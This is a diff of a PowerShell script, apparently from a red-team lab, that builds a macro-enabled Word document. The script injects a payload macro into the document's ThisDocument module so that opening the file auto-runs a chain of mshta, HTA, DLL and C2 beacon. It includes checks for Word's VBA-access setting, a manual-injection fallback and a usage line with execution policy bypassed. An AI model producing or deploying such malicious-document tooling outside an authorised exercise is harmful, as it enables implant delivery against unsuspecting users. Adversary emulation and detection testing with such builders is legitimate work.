@@ -1,56 +1,84 @@
 <#
 .SYNOPSIS
-Run on WS01 (with Word installed and logged in as any lab user). Creates a
-macro-enabled Word document (test.docm) that contains the c0015 entry macro
-(payloads/docm/macro_payload.vba) so that opening the document auto-executes
-macro -> mshta -> HTA -> DLL -> beacon (S1..S3).
+Run on WS01 (with Microsoft Word installed). Creates a macro-enabled
+document (test.docm) that embeds the c0015 entry macro so that opening
+the document auto-executes macro -> mshta -> HTA -> DLL -> beacon (S1..S3).
 
-Requirements for the auto-injection to work:
-  - Microsoft Word installed on WS01 (currently "pending verification" - check first).
+Requirements for programmatic VBA injection to work:
   - Word: Options > Trust Center > Macro Settings >
-      "Enable VBA macros" (or place test.docm in a Trusted Location),
-      and "Trust access to the VBA project object model" (needed only by the
-      COM builder that injects the VBA; if this is off, use the Manual fallback).
+      * "Enable VBA macros"  (or place test.docm in a Trusted Location)
+      * "Trust access to the VBA project object model"  (NEEDED for COM injection)
+  If "Trust access..." is off, Word raises 0x800A802D ("Project is unviewable").
+  Use the -SkipInject fallback to build a macro-enabled docm without injecting,
+  then paste the macro manually (Alt+F11, Insert > Module, paste macro_payload.vba).
 
 .PARAMETER MacroSource  Path to payloads/docm/macro_payload.vba (default).
 .PARAMETER OutPath      Where to save test.docm (default Desktop\test.docm).
-.PARAMETER Visible      Show Word window during build (default true, so you can trust macros on the newly created doc).
+.PARAMETER SkipInject   Do not inject VBA via COM; just create an empty .docm
+                        (manual paste fallback).
 .EXAMPLE
-pwsh -ExecutionPolicy Bypass -File payloads/packaging/install_macro_docm.ps1 -MacroSource C:\c0015\macro_payload.vba
+powershell -ExecutionPolicy Bypass -File payloads/packaging/install_macro_docm.ps1 -MacroSource .\macro_payload.vba
 #>
 param(
     [string]$MacroSource = (Join-Path $PSScriptRoot '..\docm\macro_payload.vba'),
     [string]$OutPath = (Join-Path ([Environment]::GetFolderPath('Desktop')) 'test.docm'),
-    [switch]$Visible
+    [switch]$SkipInject
 )
 $ErrorActionPreference = 'Stop'
 
-# ---- prerequisite check: Word present ----
+# ---- prerequisite: Word installed ----
 $wordProg = Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\winword.exe' -ErrorAction SilentlyContinue
 if (-not $wordProg) { throw "Word not found on WS01 - verify ODT Word install (M-1 gate) before continuing." }
-if (-not (Test-Path -LiteralPath $MacroSource)) { throw "macro source not found: $MacroSource" }
+if (-not $SkipInject -and -not (Test-Path -LiteralPath $MacroSource)) { throw "macro source not found: $MacroSource" }
 
+# ---- preflight: is programmatic VBA access enabled? (informational) ----
+$accessVBOM = (Get-ItemProperty 'HKCU:\Software\Microsoft\Office\16.0\Word\Security' -Name AccessVBOM -ErrorAction SilentlyContinue).AccessVBOM
+if ($null -eq $accessVBOM) { $accessVBOM = (Get-ItemProperty 'HKCU:\Software\Microsoft\Office\15.0\Word\Security' -Name AccessVBOM -ErrorAction SilentlyContinue).AccessVBOM }
+if (-not $SkipInject -and $accessVBOM -ne 1) {
+    Write-Warning "AccessVBOM is not 1. If COM injection fails with 0x800A802D, enable: Word > Options > Trust Center > Macro Settings > 'Trust access to the VBA project object model'."
+}
+
+if ($SkipInject) {
+    # ---- fallback: create an empty macro-enabled docm for manual macro paste ----
+    $word = New-Object -ComObject Word.Application
+    $word.Visible = $true
+    try {
+        $doc = $word.Documents.Add()
+        $doc.SaveAs([ref]$OutPath, [ref]13)   # 13 = wdFormatXMLDocumentMacroEnabled
+        $doc.Close()
+        Write-Output "empty docm created (manual paste): $OutPath"
+        Write-Output "Open it: Alt+F11 -> Insert > Module -> paste macro_payload.vba -> save."
+    }
+    finally {
+        if ($null -ne $word) { $word.Quit() }
+        if ($word) { [System.Runtime.Interopservices.Marshal]::ReleaseComObject($word) | Out-Null }
+    }
+    return
+}
+
+# ---- COM injection ----
 $code = Get-Content -LiteralPath $MacroSource -Raw
-# strip VB_Name attribute / any module-attribute lines (they are invalid via AddFromString)
+# strip VB_Name attribute / any module-attribute lines (invalid via AddFromString)
 $code = $code -replace '(?m)^Attribute\s+VB_Name.*$', ''
 
 $word = New-Object -ComObject Word.Application
-$word.Visible = [bool]$Visible
+# visible helps the Word VBE work reliably during injection
+$word.Visible = $true
 try {
     $doc = $word.Documents.Add()
 
-    $proj = $null
     try {
-        $proj = $word.VBE.ActiveVBProject   # requires "Trust access to VBA project object model"
+        $proj = $word.VBE.ActiveVBProject      # requires "Trust access to the VBA project object model"
     } catch {
         $word.Quit()
-        throw "Word blocked VBA project access. Enable: Options > Trust Center > Macro Settings > 'Trust access to the VBA project object model', then re-run."
+        throw "Word blocked VBA project access (0x800A802D family). Enable: Word > Options > Trust Center > Macro Settings > 'Trust access to the VBA project object model', then re-run. Or use -SkipInject and paste the macro manually."
     }
 
-    # insert into the ThisDocument class module (Document_Open) and a standard module (AutoOpen)
-    $mod = $proj.VBComponents.Add(1)         # 1 = vbext_ct_StdModule
-    $mod.Name = "c0015Entry"
-    $mod.CodeModule.AddFromString($code)
+    # Inject directly into the ThisDocument class module. Document_Open (and
+    # AutoOpen) live here; no module creation/rename involved, which avoids
+    # the "Project is unviewable" failure on the module rename step.
+    $thisDoc = $proj.VBComponents('ThisDocument')
+    $thisDoc.CodeModule.AddFromString($code)
 
     # SaveAs FileFormat 13 = wdFormatXMLDocumentMacroEnabled (.docm)
     $doc.SaveAs([ref]$OutPath, [ref]13)
@@ -58,7 +86,11 @@ try {
     Write-Output "docm created: $OutPath"
     Write-Output "Open it with macros enabled to auto-run the chain (verify C2-SIM log)."
 }
+catch {
+    if ($null -ne $word) { try { $word.Quit() } catch {} }
+    throw "VBA injection failed: $($_.Exception.Message). Enable 'Trust access to the VBA project object model', or use -SkipInject and paste the macro manually."
+}
 finally {
-    if ($null -ne $word) { $word.Quit() }
-    [System.Runtime.Interopservices.Marshal]::ReleaseComObject($word) | Out-Null
+    if ($null -ne $word) { try { $word.Quit() } catch {} }
+    if ($word) { [System.Runtime.Interopservices.Marshal]::ReleaseComObject($word) | Out-Null }
 }
